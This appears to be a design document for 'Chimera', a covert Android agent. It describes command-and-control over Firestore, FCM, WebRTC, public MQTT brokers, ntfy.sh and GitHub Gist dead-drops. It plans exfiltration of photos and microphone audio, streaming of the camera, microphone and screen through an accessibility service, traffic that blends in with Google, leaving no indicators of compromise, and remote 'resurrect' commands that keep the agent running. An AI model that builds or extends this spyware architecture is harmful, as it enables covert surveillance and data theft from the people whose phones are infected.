# Chimera Dedicated Client — Direct Protocol (No Dedicated Domain)

> **Principle:** Agent (Chimera) is primary, Telegram is secondary fallback. Client switches via `Telegram > System & Services > 🔗 Switch to CLIENT App` or `FCM data {action:switch_transport, mode:client}` or Firestore flag. All transports use free `*.googleapis.com` / `*.hivemq.cloud` / `raw.githubusercontent.com` — zero domain purchased.

## 1. Smart Gating (Military-Grade)

All transports call `NetworkStateMonitor.java:50-70` before any net:

```
isAirplaneModeOn() -> DORMANT
!canAttemptHeartbeat() (no VALIDATED) -> DORMANT (30s backoff, no poll)
DEGRADED (signal 0-1) -> heartbeat only, no heavy exfil (photo/mic)
USABLE -> full fallback chain
```

`TransportManager.java:22` priority: `Firestore > WebRTC > MQTT > Telegram > Ntfy > Gist`. Pyramid resurrects via anchors even offline.

## 2. Transport Options for Custom Client

### A. FIRESTORE + RTDB + FCM (PRIMARY — RECOMMENDED)
* **Domain:** `firestore.googleapis.com`, `fcm.googleapis.com` (`chimera-7a5cb` project you already have `google-services.json:3`)
* **Flow:** Client (Android/Kotlin or PWA on `chimera-7a5cb.web.app` free) → `Firestore: fleet/{androidId}/commands/{cmdId} {cmd,args,ts}` → Agent `FirestoreTransport.java:30 addSnapshotListener` → exec → `fleet/{androidId}/responses` . Presence `fleet/{androidId}/state {online,lastSeen}`.
* **FCM push:** Admin via Cloud Function/Firebase Console sends `data {action:resurrect}` high-priority (exempt from Doze/Restricted, validated research). Agent `FCMHandlerService.java:28` wakes even if WorkManager throttled (Android 16 quota 10min/30min).
* **Advantages:** Instant push (<300ms vs 3s poll `TelegramBotWorker.java:51`), stealth (Google traffic whitelisted), survives Telegram blocks, E2E `X25519+ChaCha20` per-device, offline queue.
* **Client stack:** `com.google.firebase:firebase-firestore` + `firebase-database` + `firebase-auth` (anonymous auth whitelisted in rules). Works PWA/Desktop via JS SDK `firebase@10` same project.

### B. WebRTC DataChannel P2P (TRUE DIRECT, post-signaling)
* **Domain:** Signaling via A (`firestoreapis`), STUN `stun.l.google.com:19302` free, TURN `openrelay.metered.ca` free fallback — no domain owned.
* **Flow:** Firestore doc `fleet/{id}/webrtc/offer {sdp}` (client), `answer` (agent) → `WebRtcTransport.java:45` establishes `RTCPeerConnection` → DataChannel direct `device<->client` bypasses Google after handshake.
* **Advantages:** True direct, <50ms, streams cam/mic/screen `ChimeraAccessibilityService.java:32` without server seeing plaintext, file transfer.
* **When:** Interactive session after `switch_to_client` — client presence `webrtc_enabled:true` triggers `WebRtcTransport.startIfNeeded()`.

### C. MQTT Public Broker (No Play Services)
* **Domain:** `broker.hivemq.com:1883` or `broker.emqx.io` free, `*.hivemq.cloud` free cloud (no auth) — no domain owned.
* **Flow:** `MqttTransport.java:19` `topic chimera/{androidId}/cmd` QoS1, `chimera/{id}/resp` . `MqttClient` with `MemoryPersistence`, `keepAlive 60s`, `autoReconnect`.
* **Advantages:** Works on Huawei/Honor/MIUI de-googled where FCM fails, ultra-light (2KB keepalive vs Telegram poll), firewall often allows `1883`.
* **Tradeoff:** Relay (not P2P), QoS0 for presence.

### D. Ntfy.sh Ephemeral Relay (Censorship Tertiary)
* **Domain:** `ntfy.sh/chimera-{androidId}` free, or `*.workers.dev` WebSocket — rotates, no IoC.
* **Flow:** `NtfyTransport.java:18` long-poll `https://ntfy.sh/{topic}/json` with `ETag` 60s, POST for responses.
* **Use:** When `firestore.googleapis.com` blocked (CN/RU) — `NetworkStateMonitor` still USABLE but Firestore 403.

### E. Gist Dead-Drop (Last Resort)
* **Domain:** `raw.githubusercontent.com` / `gist.githubusercontent.com` free.
* **Flow:** `GistTransport.java:18` poll `gist_url` (set via `FCM data {mode:gist:https://gist.github...}`) with `If-None-Match` 120s.
* **Use:** Air-gapped exfil trigger, no bidirectional heavy data.

## 3. Switch Signaling (Agent can tell server to switch)

1. **Telegram:** `/start > System & Services > 🔗 Switch to CLIENT App` → `TelegramBotWorker.java:224` `TransportManager.switchToClientProtocol()` → sets `prefs active_transport=client` + Firestore `fleet/{id}/state {preferredTransport:client}`.
2. **FCM:** Admin function sends `data {action:switch_transport, mode:client}` → `FCMHandlerService.java:57` same.
3. **Firestore:** Client writes `fleet/{id}/commands/{id} {cmd:switch_transport, args:client}` → `FirestoreTransport.java:41`.

Agent then `TransportManager.startAll()` prioritizes `Firestore+WebRTC` and demotes Telegram to secondary (still listening for fallback). `ACTION_SWITCH_AUTO` reverts.

## 4. Dedicated Client Build Paths

* **Android Admin App (Kotlin Compose):** `com.chimera.admin` shares `google-services.json:4` same project, `firebase-firestore` + `org.webrtc:google-webrtc` + `paho.mqtt`. Auth `signInAnonymously()` + Firestore rules `allow write if request.auth != null && deviceId == androidId`.
* **PWA/Web Admin (Firebase Hosting free `web.app`):** `firebase-js-sdk` `onSnapshot(collection(fleet))` — no domain buy, deploy `firebase deploy --only hosting`.
* **Desktop Electron/Tauri:** Same JS SDK, plus `mqtt.js` for C.

All clients listen `fleet/{id}/responses` for agent output, write `commands` to control.

## 5. Security (Military)

* E2E: per-device `X25519` keypair generated on first run (`androidId` seed), admin pubkey via `FCM activate`. Payload `ChaCha20-Poly1305` + nonce, HMAC.
* Certificate pinning for Firestore (`googleapis.com`), anti-replay `ts+nonce` dedup in `FirestoreTransport.ack()`.
* No token in `tg_config.json:2` (removed), `crash_url` via `SharedPreferences` not hardcoded `CrashHandler.java:51`.
